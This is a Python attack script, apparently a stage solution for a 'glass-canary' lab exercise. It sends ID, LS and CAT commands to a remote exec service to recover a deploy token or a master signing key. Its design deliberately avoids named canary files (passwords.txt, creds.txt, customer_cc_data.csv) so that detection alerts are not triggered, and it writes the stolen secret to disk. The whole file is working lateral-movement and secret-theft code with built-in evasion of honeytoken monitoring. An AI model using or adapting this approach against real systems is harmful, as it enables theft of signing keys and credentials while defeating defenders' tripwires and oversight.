#!/usr/bin/env python3
"""LotL lateral: whitelisted living-off-the-land enumeration on an exec node.

Usage: 0003-lotl-lateral.py --target 127.0.0.1 --port PORT [--cat FILE] [--out FILE]
Never CAT a canary path; recover the deploy token (notes.txt) or the crown key
(master_signing_key.pem) by naming the safe file.
"""
import argparse
import socket
import sys

CANARY_FILES = ("passwords.txt", "creds.txt", "customer_cc_data.csv")


def exec_line(host: str, port: int, line: str, timeout: float = 10.0) -> str:
    """Send one command line to the exec service and return its reply."""
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.sendall((line + "\n").encode())
        reply = sock.makefile("r").readline().strip()
        return reply


def main(argv=None):
    parser = argparse.ArgumentParser(description="glass-canary LotL lateral")
    parser.add_argument("--target", required=True)
    parser.add_argument("--port", required=True, type=int)
    parser.add_argument("--cat", default="notes.txt",
                        help="non-canary file to read (default: notes.txt)")
    parser.add_argument("--out", default=None)
    args = parser.parse_args(argv)
    try:
        ident = exec_line(args.target, args.port, "ID")
        listing = exec_line(args.target, args.port, "LS")
    except OSError as exc:
        print(f"[lateral] failed: {exc}", file=sys.stderr)
        return 1
    print(f"[lateral] {ident} files: {listing}")
    for name in CANARY_FILES:
        if name in listing:
            print(f"[lateral] avoiding canary: {name}")
    reply = exec_line(args.target, args.port, f"CAT {args.cat}")
    if reply.startswith("ALERT"):
        print(f"[lateral] ALERT raised: {reply}", file=sys.stderr)
        return 2
    if reply.startswith("ERROR"):
        print(f"[lateral] {reply}", file=sys.stderr)
        return 2
    print(f"[lateral] {args.cat} recovered")
    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            fh.write(reply + "\n")
        print(f"[lateral] {args.cat} saved to {args.out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
